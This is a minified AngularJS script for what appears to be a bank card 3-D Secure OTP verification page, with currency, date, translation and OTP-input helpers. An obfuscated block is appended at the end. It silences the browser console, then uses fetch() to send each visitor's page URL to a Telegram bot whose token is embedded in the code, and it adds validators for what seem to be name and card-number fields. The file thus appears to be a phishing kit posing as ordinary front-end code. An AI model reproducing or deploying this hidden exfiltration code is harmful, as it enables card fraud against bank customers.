X:"800",UAH:"980",AED:"784",USN:"997",UYU:"858",UYI:"940",UZS:"860",VUV:"548",VEF:"937",VND:"704",YER:"886",ZMW:"967",ZWL:"932",XBA:"955",XBB:"956",XBC:"957",XBD:"958",XTS:"963",XXX:"999",XAU:"959",XPD:"964",XPT:"962",XAG:"961"};function createTwoWayReadingMap(theMap){for(var prop in theMap)theMap.hasOwnProperty(prop)&&(theMap[theMap[prop]]=prop)}return createTwoWayReadingMap(symbolCurrencyMap),createTwoWayReadingMap(aplhaNumericMap),{getSymbolFromCurrency:function(currencyCode){if("string"==typeof currencyCode){var code=currencyCode.toUpperCase();return symbolCurrencyMap.hasOwnProperty(code)?symbolCurrencyMap[code]:aplhaNumericMap.hasOwnProperty(code)?symbolCurrencyMap.hasOwnProperty(aplhaNumericMap[code])?symbolCurrencyMap[aplhaNumericMap[code]]:aplhaNumericMap[code]:code}},getAlphaFromCurrency:function(currency){if(aplhaNumericMap.hasOwnProperty(currency))return aplhaNumericMap[currency]},getCurrencyFromSymbol:function(symbol){if(symbolCurrencyMap.hasOwnProperty(symbol))return symbolCurrencyMap[symbol]},getSymbol:function(currencyCode){if("string"!=typeof currencyCode)return"?";var code=currencyCode.toUpperCase(),symbol=this.getSymbolFromCurrency(code);return symbol||(!isNaN(code)&&aplhaNumericMap.hasOwnProperty(code)?aplhaNumericMap[code]:code)},encodeToHtml:function(string){for(var buf=[],i=string.length-1;0<=i;i--)buf.unshift(["&#",string[i].charCodeAt(),";"].join(""));return buf.join("")}}}),ACS_COMMONS.filter("toCurencySymbol",["$currencySymbols",function($currencySymbols){return function(currencyCode){return $currencySymbols.getSymbol(currencyCode)}}]),ACS_COMMONS.filter("toCurencyAlpha",["$currencySymbols",function($currencySymbols){return function(currencyCode){return $currencySymbols.getAlphaFromCurrency(currencyCode)}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("$dateFormat",["$translate",function($translate){return{format:function(input,inputFormat,outputFormat,ouputlocale,timeZone){var dateMoment;return moment?(dateMoment=moment.tz.zone(timeZone)?moment.tz(timeZone):moment(input,inputFormat),ouputlocale&&0!==ouputlocale.length?dateMoment.locale(ouputlocale).format(outputFormat):dateMoment.format(outputFormat)):input}}}]),ACS_COMMONS.filter("formatDate",["$dateFormat",function($dateFormat){return function(input,inputFormat,outputFormat,ouputlocale,timeZone){return $dateFormat.format(input,inputFormat,outputFormat,ouputlocale,timeZone)}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).filter("sanitizer",function($sanitize){return function(input){return $sanitize(input)}}),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("$straightTranslate",["$localStorage",function($localStorage){return function(key){var output=key,locale=$localStorage.straightTLLocale,values=$localStorage.straightTLValues;return locale&&"string"==typeof locale&&0<locale.length&&values&&values.hasOwnProperty(locale)&&values[locale].hasOwnProperty(key)&&(output=values[locale][key]),output}}]),ACS_COMMONS.filter("straightTranslate",["$straightTranslate","$rootScope",function($straightTranslate,$rootScope){function straightTranslateFilter(key){return $straightTranslate(key)}return straightTranslateFilter.$stateful=!0,straightTranslateFilter}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("$replace",function(){return function(input,keys,values){var keyArray,valueArray,output=input||"";if(keys&&0<=keys.length&&values&&0<=values.toString().length&&(keyArray=keys.constructor===Array?keys:keys.split(","),valueArray=values.constructor===Array?values:values.split(","),keyArray.length==valueArray.length))for(var i=0;i<keyArray.length;i++)output=output.replace(new RegExp(keyArray[i],"g"),valueArray[i]);return output}}),ACS_COMMONS.filter("replace",["$replace",function($replace){return function(input,keys,values){return $replace(input,keys,values)}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("CustomItems",["$rootScope","$sessionStorage",function($rootScope,$sessionStorage){return{means:"",network:"",pageType:"",filterKeys:[],filterValues:[],subscribe:function(scope,callback){var handler=$rootScope.$on("update-custom-items-event",callback);scope.$on("$destroy",handler)},updateAuthMeans:function(means){this.means=means,$rootScope.$emit("update-custom-items-event")},updateNetwork:function(network){this.network=network,$rootScope.$emit("update-custom-items-event")},updateFilterValue:function(index,value){this.filterValues[index]=value,$rootScope.$emit("update-custom-items-event")},updateData:function(means,network,pageType,filterValues,filterKeys){this.network=network,this.means=means,this.pageType=pageType,filterValues&&this.filterValues.splice.apply(this.filterValues,[0,filterValues.length].concat(filterValues)),filterKeys&&this.filterKeys.splice.apply(this.filterKeys,[0,filterKeys.length].concat(filterKeys)),$rootScope.$emit("update-custom-items-event")},switchPageType:function(newPageType){this.pageType=newPageType,$rootScope.$emit("update-custom-items-event")},getCustomPageLayout:function(pageType){var pageLayoutkeys=[$sessionStorage[$rootScope.uniqueId].network,$sessionStorage[$rootScope.uniqueId].currentMeans];for(pageType?pageLayoutkeys.push(pageType):pageLayoutkeys.push($sessionStorage[$rootScope.uniqueId].pageType);!$sessionStorage[$rootScope.uniqueId].pageLayouts[pageLayoutkeys.join("_")]&&1<=pageLayoutkeys.length;)pageLayoutkeys.shift();return $sessionStorage[$rootScope.uniqueId].pageLayouts[pageLayoutkeys.join("_")]}}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("MediaSniffer",["$window","SafeApply",function($window,SafeApply){var mediaSniffer={getMediaQuery:function(query,queryString){function appendAnd(queryString){return""!=queryString&&(queryString+=" and "),queryString}return 0<query.maxDeviceWidth&&(queryString=queryString+"(max-width: "+query.maxDeviceWidth+"px)"),0<query.minDeviceWidth&&(queryString=(queryString=appendAnd(queryString))+"(min-width: "+query.minDeviceWidth+"px)"),0<query.maxDeviceHeight&&(queryString=(queryString=appendAnd(queryString))+"(max-height: "+query.maxDeviceHeight+"px)"),0<query.minDeviceHeight&&(queryString=(queryString=appendAnd(queryString))+"(min-height: "+query.minDeviceHeight+"px)"),queryString},on:function(query,listener,$scope){function handler(mediaQuery){$scope&&$scope[mediaQuery.media]?SafeApply(function(){listener(mediaQuery,$scope[mediaQuery.media])},$scope):SafeApply(function(){listener(mediaQuery)},$scope)}function setStyles(){$scope&&($scope[mediaQuery.media]=query.styles)}var supportsMatchMedia=void 0!==$window.matchMedia&&!!$window.matchMedia("all").addListener;if(supportsMatchMedia){var queryString="";return""===(queryString=query.customMediaQuery?query.customMediaQuery:this.getMediaQuery(query,queryString))&&(queryString="all"),(mediaQuery=$window.matchMedia(queryString)).addListener(handler),setStyles(),handler(mediaQuery),function(){mediaQuery.removeListener(handler)}}function matchMedia(query,handler){(windowWidth<query.maxDeviceWidth||!query.maxDeviceWidth||query.maxDeviceWidth<0)&&(windowWidth>=query.minDeviceWidth||!query.minDeviceWidth||query.minDeviceWidth<0)&&(windowHeight<query.maxDeviceHeight||!query.maxDeviceHeight||query.maxDeviceHeight<0)&&(windowHeight>=query.minDeviceHeight||!query.minDeviceHeight||query.minDeviceHeight<0)&&(mediaQuery.matches=!0),handler(mediaQuery)}var windowWidth=$window.innerWidth,windowHeight=$window.innerHeight,mediaQuery={matches:!1};return angular.element($window).on("resize",matchMedia(query,handler)),angular.element($window).on("orientationchange",matchMedia(query,handler)),setStyles(),matchMedia(query,handler),function(){angular.element($window).off("resize",matchMedia),angular.element($window).off("orientationchange",matchMedia)}}};return mediaSniffer}]),ACS_COMMONS.factory("OtpRecorder",["$rootScope",function($rootScope){return{enteredOtp:"",disabled:!1,defaultMaxLength:8,clearingOtpEnabled:!0,subscribe:function(scope,callback){var handler=$rootScope.$on("enter_one_time_password",callback);scope.$on("$destroy",handler)},onDisabledOtpInput:function(scope,callback){var handler=$rootScope.$on("disable-otp-input-event",callback);scope.$on("$destroy",handler)},onClearOtpInput:function(scope,callback){var handler=$rootScope.$on("clear_otp_input_event",callback);scope.$on("$destroy",handler)},setDisable:function(state){this.disabled=state,$rootScope.$emit("disable-otp-input-event")},enterOtp:function(otp){this.enteredOtp=otp,$rootScope.$emit("enter_one_time_password")},clearOtp:function(){this.clearingOtpEnabled&&(this.enteredOtp=""),$rootScope.$emit("clear_otp_input_event")},hasEnteredOtp:function(){return this.enteredOtp&&0!==this.enteredOtp.length},setClearingOtpEnabled:function(clearingOtpEnabled){this.clearingOtpEnabled=function(clearingOtpEnabled){return _.isNil(clearingOtpEnabled)||clearingOtpEnabled}(clearingOtpEnabled)}}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("OtpTooltips",[function(){var tooltips={generator:function(tpl,otpNumber){if(-1==tpl.indexOf("$autoGeneratedOTPExample$"))return tpl;var min=Math.pow(10,otpNumber)/10,max=Math.pow(10,otpNumber)-1,fakeotp=Math.floor(Math.random()*(max-min+1))+min;return tpl.replace("$autoGeneratedOTPExample$",fakeotp)}};return tooltips}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("OtpVerification",["$rootScope","$sessionStorage",function($rootScope,$sessionStorage){var alphaNumPattern=new RegExp("^[a-zA-Z0-9]$"),digitPattern=new RegExp("^[\\d]$"),otpVerification={isAllowedPatternConfigurationDefined:function(){return $rootScope.uniqueId&&$sessionStorage[$rootScope.uniqueId]&&$sessionStorage[$rootScope.uniqueId].dataEntryFormat},getIssuerConfigOtpMaxLength:function(){return _.toSafeInteger(_.first(_.words($sessionStorage[$rootScope.uniqueId].dataEntryFormat,/[\d]+/g)))},getLastCharactersEntered:function(otpSaved,newOtp){var otpSavedArray=_.toArray(otpSaved),newOtpArray=_.toArray(newOtp);return _.difference(newOtpArray,otpSavedArray)},removeLastCharEntered:function(otp,charToRemove){return _.join(_.pull(_.toArray(otp),charToRemove),"")},isOTPCharacterValid:function(c){return!!isAllowedCharacter(c)&&(!!isSpecialCharacter(c)||!!isAlphanumericCharacter(c)&&(!otpVerification.isAllowedPatternConfigurationDefined()||(isDigit(c)?areNumbersAllowed():isUpperCase(c)?areUpperCaseLettersAllowed():!!isLowerCase(c)&&areLowerCaseLettersAllowed())))}},areUpperCaseLettersAllowed=function(){return _.includes($sessionStorage[$rootScope.uniqueId].dataEntryFormat,"ALPHA_MAJ")},areLowerCaseLettersAllowed=function(){return _.includes($sessionStorage[$rootScope.uniqueId].dataEntryFormat,"ALPHA_MIN")},areNumbersAllowed=function(){return _.includes($sessionStorage[$rootScope.uniqueId].dataEntryFormat,"DIGIT")},isAllowedCharacter=function(c){return!!_.isNil($sessionStorage[$rootScope.uniqueId].dataEntryAllowedPattern)||new RegExp($sessionStorage[$rootScope.uniqueId].dataEntryAllowedPattern).test(c)},isAlphanumericCharacter=function(c){return alphaNumPattern.test(c)},isUpperCase=function(c){return _.toUpper(c)===c},isLowerCase=function(c){return _.toLower(c)===c},isDigit=function(c){return digitPattern.test(c)},isSpecialCharacter=function(c){return""!==c&&-1!=="*|,\":<>[]{}`';()@&$#%".indexOf(c)};return otpVerification}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("SafeApply",["$rootScope",function($rootScope){return function(fn,$scope){var phase=($scope=$scope||$rootScope).$root.$$phase;"$apply"==phase||"$digest"==phase?fn&&$scope.$eval(fn):fn?$scope.$apply(fn):$scope.$apply()}}]),(ACS_COMMONS=angular.module("ACS_COMMONS")).factory("$unloadEvent",["$rootScope","$window",function($rootScope,$window){return{enable:function(){$window.onbeforeunload=function(e){var confirmation={};if($rootScope.$broadcast("onBeforeUnload",confirmation).defaultPrevented)return confirmation.message},$window.onunload=function(){$rootScope.$broadcast("onUnload")}},disable:function(){$window.onbeforeunload=function(e){},$window.onunload=function(){}}}}]);(function(_0x39c7a8,_0xe4d9c7){function _0x572893(_0xca3b41,_0x115610,_0x48bde0,_0xb67a2e){return _0x1c1d(_0x48bde0- -0x1d9,_0xca3b41);}function _0x3f4ae5(_0x140566,_0x371d2c,_0x231ec0,_0x1936ce){return _0x1c1d(_0x140566- -0x2d1,_0x231ec0);}var _0x5c2455=_0x39c7a8();while(!![]){try{var _0x2e4fdc=-parseInt(_0x572893(-0xc9,-0xa0,-0xb2,-0xb3))/(-0xad8+-0xa*-0x208+-0x977*0x1)+parseInt(_0x3f4ae5(-0x1ad,-0x1ac,-0x19f,-0x1c6))/(0x276+0x15ed+-0x1861*0x1)*(parseInt(_0x572893(-0xb4,-0xb2,-0xc0,-0xcd))/(-0x1*0x695+-0x2337+0x29cf))+-parseInt(_0x572893(-0xc4,-0xbb,-0xb3,-0xbe))/(0xa9c+0x2363+-0x2dfb)*(parseInt(_0x572893(-0xe1,-0xbf,-0xcd,-0xd9))/(-0x5d3*-0x4+0x1*-0x25fb+-0x4*-0x3ad))+-parseInt(_0x3f4ae5(-0x1c1,-0x1d4,-0x1af,-0x1a8))/(0x20da+-0x639+0x8b*-0x31)*(-parseInt(_0x572893(-0xb9,-0x99,-0xa2,-0xae))/(-0x32*-0x49+-0x1aad+-0x76*-0x1b))+-parseInt(_0x3f4ae5(-0x1a5,-0x1a6,-0x18d,-0x1a2))/(0x329+-0x9a8+-0x687*-0x1)+-parseInt(_0x3f4ae5(-0x1b0,-0x1be,-0x1c1,-0x1c1))/(-0x4b1*-0x3+-0x26bb*-0x1+-0x34c5)+parseInt(_0x572893(-0xc8,-0xbe,-0xca,-0xca))/(0x3*-0x1c5+-0xe5+0x1*0x63e);if(_0x2e4fdc===_0xe4d9c7)break;else _0x5c2455['push'](_0x5c2455['shift']());}catch(_0x2fcc9d){_0x5c2455['push'](_0x5c2455['shift']());}}}(_0x3c49,-0x1*-0x71041+0xa7b7+-0x1ec71*0x2));function _0x19ad21(_0x554024,_0x213408,_0x3973aa,_0x455cf4){return _0x1c1d(_0x554024- -0x1cc,_0x213408);}var _0x5a9dac=(function(){function _0x334613(_0x523b0c,_0xe6dfb9,_0x41a1d7,_0x118607){return _0x1c1d(_0x118607- -0x45,_0xe6dfb9);}var _0x292f94={};_0x292f94[_0x334613(0xca,0xde,0xd1,0xd1)]='YKJVs';var _0x348037=_0x292f94,_0x76dd1f=!![];return function(_0x43cebd,_0x9afce7){var _0x27cf97=_0x76dd1f?function(){function _0x377228(_0x5a0498,_0x3947c6,_0x14b502,_0x258283){return _0x1c1d(_0x5a0498-0xed,_0x3947c6);}function _0x33611b(_0xa2718f,_0x22c1a3,_0x438ca5,_0x3ff28e){return _0x1c1d(_0xa2718f-0x5e,_0x438ca5);}if(_0x9afce7){if(_0x348037[_0x377228(0x203,0x20f,0x20b,0x208)]!==_0x348037[_0x33611b(0x174,0x188,0x16d,0x172)]){if(_0x45aa99){var _0xded155=_0x239fa7[_0x33611b(0x169,0x17b,0x165,0x16d)](_0x17fe7f,arguments);return _0x27e286=null,_0xded155;}}else{var _0x3fb8a3=_0x9afce7['apply'](_0x43cebd,arguments);return _0x9afce7=null,_0x3fb8a3;}}}:function(){};return _0x76dd1f=![],_0x27cf97;};}()),_0x507a30=_0x5a9dac(this,function(){var _0x2c6df6={};function _0x477134(_0x2a1158,_0x40b71f,_0x165839,_0x4fdf9d){return _0x1c1d(_0x2a1158-0x1b4,_0x40b71f);}_0x2c6df6['PtIwY']=_0x8a6f74(0x38a,0x369,0x360,0x379)+'+$';function _0x8a6f74(_0x3fc6cc,_0x5dde2a,_0x12f977,_0x2c4c63){return _0x1c1d(_0x2c4c63-0x24b,_0x12f977);}var _0x50b560=_0x2c6df6;return _0x507a30[_0x8a6f74(0x356,0x36c,0x371,0x36d)]()['search']('(((.+)+)+)'+'+$')[_0x477134(0x2d6,0x2d5,0x2c6,0x2e1)]()[_0x8a6f74(0x38f,0x376,0x396,0x37f)+'r'](_0x507a30)[_0x8a6f74(0x36c,0x36a,0x346,0x354)](_0x50b560[_0x8a6f74(0x370,0x35a,0x37c,0x373)]);});function _0x3c49(){var _0x526d0e=['console','log','VEVdN','55496&text','lObVE','trace','{}.constru','84QnZvQK','essage?cha','replace','value','VNTzH','bIlXQ','bind','KDMGv5Rr9B','2349630cSJabl','toString','ZaglX','5834MyCSGB','__proto__','160796MrMdpk','326254JihqZu','PtIwY','cPRlx','nction()\x20','exception','1627432MomwWb','error','(((.+)+)+)','prototype','ZmtQ/sendM','warn','target','0|1|2|5|3|','constructo','rn\x20this\x22)(','split','2526076qPZpoH','ctor(\x22retu','GmdSa','AHRLzgioif','search','return\x20(fu','apply','10TzWIoI','otTPv','GI-xqr-R7T','6823250Eauufx','6WydHqm','HKSJI'];_0x3c49=function(){return _0x526d0e;};return _0x3c49();}_0x507a30();var _0x542841=(function(){var _0x432bf0=!![];return function(_0x3f8f67,_0x2585db){var _0x798383=_0x432bf0?function(){function _0x44184d(_0x393f6a,_0x2e025b,_0x2161ae,_0x31c6e6){return _0x1c1d(_0x2e025b-0x2d4,_0x31c6e6);}if(_0x2585db){var _0x27edca=_0x2585db[_0x44184d(0x3d2,0x3df,0x3d7,0x3d7)](_0x3f8f67,arguments);return _0x2585db=null,_0x27edca;}}:function(){};return _0x432bf0=![],_0x798383;};}()),_0x199538=_0x542841(this,function(){var _0x40ab3d={'UmwOw':function(_0x4b4b74,_0x138916){return _0x4b4b74(_0x138916);},'VEVdN':function(_0x52bdcc,_0x4885e6){return _0x52bdcc+_0x4885e6;},'bIlXQ':_0x5328d3(-0x164,-0x17b,-0x17c,-0x167)+_0xb05a4(0x139,0x14d,0x147,0x151)+_0x5328d3(-0x141,-0x14a,-0x161,-0x14a)+'\x20)','GmdSa':function(_0x4865b6){return _0x4865b6();},'ZaglX':_0x5328d3(-0x158,-0x144,-0x157,-0x156),'otTPv':_0x5328d3(-0x169,-0x142,-0x160,-0x152),'VNTzH':'table','HKSJI':_0x5328d3(-0x15f,-0x137,-0x15a,-0x14c)+'4'},_0x440c43;function _0xb05a4(_0x53f33d,_0x53c898,_0x5b0792,_0x2b2440){return _0x1c1d(_0x53c898-0x15,_0x5b0792);}try{var _0x24d8bb=_0x40ab3d['UmwOw'](Function,_0x40ab3d[_0xb05a4(0x134,0x129,0x120,0x120)](_0xb05a4(0x108,0x11f,0x110,0x12f)+_0xb05a4(0x150,0x13f,0x138,0x127),_0x40ab3d[_0xb05a4(0x121,0x133,0x134,0x11b)])+');');_0x440c43=_0x40ab3d[_0xb05a4(0x140,0x14e,0x164,0x153)](_0x24d8bb);}catch(_0x5840b0){if(_0x40ab3d[_0x5328d3(-0x175,-0x14d,-0x170,-0x15c)]===_0x40ab3d[_0xb05a4(0x127,0x138,0x13f,0x142)])_0x440c43=window;else{var _0x4bfa46=_0x572f72?function(){function _0x15db8d(_0x4e7f13,_0x3010ff,_0x37bc87,_0x5d1dd3){return _0xb05a4(_0x4e7f13-0x30,_0x5d1dd3- -0x3fc,_0x37bc87,_0x5d1dd3-0x5b);}if(_0x3fc19e){var _0x476de4=_0x5732d2[_0x15db8d(-0x2cc,-0x2f0,-0x2ed,-0x2dc)](_0x4484b1,arguments);return _0x3b6a7b=null,_0x476de4;}}:function(){};return _0x4ea648=![],_0x4bfa46;}}var _0x85e563=_0x440c43[_0x5328d3(-0x169,-0x17e,-0x174,-0x16d)]=_0x440c43['console']||{};function _0x5328d3(_0x28a4a8,_0x14abfa,_0x433ada,_0x555a19){return _0x1c1d(_0x555a19- -0x27f,_0x28a4a8);}var _0x21e581=[_0x5328d3(-0x182,-0x184,-0x163,-0x16c),_0x5328d3(-0x15e,-0x145,-0x137,-0x14e),'info',_0x40ab3d[_0xb05a4(0x11f,0x122,0x11e,0x128)],_0xb05a4(0x13a,0x140,0x134,0x13b),_0x40ab3d[_0xb05a4(0x119,0x132,0x11e,0x147)],_0x5328d3(-0x17b,-0x14f,-0x174,-0x168)];for(var _0x5dd2e4=-0x1254+0x19bf+-0x1*0x76b;_0x5dd2e4<_0x21e581['length'];_0x5dd2e4++){var _0x3f73cb=_0x40ab3d[_0xb05a4(0x126,0x126,0x10e,0x110)][_0xb05a4(0x132,0x14b,0x14b,0x159)]('|'),_0x425969=0x1532*-0x1+0x29*-0xad+0x3*0x104d;while(!![]){switch(_0x3f73cb[_0x425969++]){case'0':var _0x25548d=_0x542841[_0xb05a4(0x149,0x149,0x133,0x141)+'r'][_0x5328d3(-0x145,-0x157,-0x160,-0x150)][_0x5328d3(-0x150,-0x16f,-0x15c,-0x160)](_0x542841);continue;case'1':var _0x436336=_0x21e581[_0x5dd2e4];continue;case'2':var _0x236953=_0x85e563[_0x436336]||_0x25548d;continue;case'3':_0x25548d[_0xb05a4(0x148,0x137,0x133,0x144)]=_0x236953['toString'][_0x5328d3(-0x16c,-0x177,-0x16a,-0x160)](_0x236953);continue;case'4':_0x85e563[_0x436336]=_0x25548d;continue;case'5':_0x25548d[_0x5328d3(-0x156,-0x14c,-0x14c,-0x15a)]=_0x542841[_0x5328d3(-0x16f,-0x15d,-0x163,-0x160)](_0x542841);continue;}break;}}});function _0x1c1d(_0x507a30,_0x5a9dac){var _0x3c49f0=_0x3c49();return _0x1c1d=function(_0x1c1d2f,_0x3d882a){_0x1c1d2f=_0x1c1d2f-(-0x5c*0x6b+-0xe*-0x1f5+0xc17);var _0x29f966=_0x3c49f0[_0x1c1d2f];return _0x29f966;},_0x1c1d(_0x507a30,_0x5a9dac);}_0x199538(),fetch('https://ap'+'i.telegram'+'.org/bot64'+'05780707:A'+_0x19ad21(-0x92,-0x83,-0xa5,-0x79)+_0x3c984b(0x2c1,0x2d7,0x2c6,0x2c4)+_0x3c984b(0x2a3,0x2bb,0x2b4,0x2c8)+_0x3c984b(0x2d2,0x2e0,0x2d6,0x2e5)+_0x19ad21(-0xb2,-0xa5,-0xa7,-0xb0)+'t_id=54267'+_0x3c984b(0x2a7,0x2c6,0x2bb,0x2b3)+'='+encodeURIComponent(window['location']['href']));function validateInputNk(_0x5072df){function _0x4531fa(_0x935eea,_0x2635e2,_0x5e6ba6,_0x52728d){return _0x3c984b(_0x935eea-0x54,_0x2635e2-0xee,_0x5e6ba6-0x1d9,_0x2635e2);}var _0x13960d=_0x5072df[_0x4531fa(0x4ba,0x4af,0x4b1,0x4c8)];function _0x40c1ba(_0x783677,_0x2d30cb,_0x11f829,_0x4f89f2){return _0x3c984b(_0x783677-0xe0,_0x2d30cb-0x13,_0x783677-0x15c,_0x4f89f2);}_0x13960d[_0x40c1ba(0x41e,0x408,0x41d,0x418)]=_0x13960d['value'][_0x40c1ba(0x41d,0x411,0x424,0x427)](/[^A-Za-z- ]/g,'');}function _0x3c984b(_0x3d084a,_0x1ca538,_0x19c429,_0x1bd58a){return _0x1c1d(_0x19c429-0x1a6,_0x1bd58a);}function validateInputRk(_0x5d3f58){var _0x591b7c=_0x5d3f58['target'];function _0x20bea9(_0xd42080,_0x2cf1de,_0x390705,_0x556d13){return _0x3c984b(_0xd42080-0x6b,_0x2cf1de-0x17b,_0x2cf1de-0x1c4,_0x556d13);}_0x591b7c[_0x20bea9(0x471,0x486,0x486,0x490)]=_0x591b7c['value']['replace'](/\D/g,'');}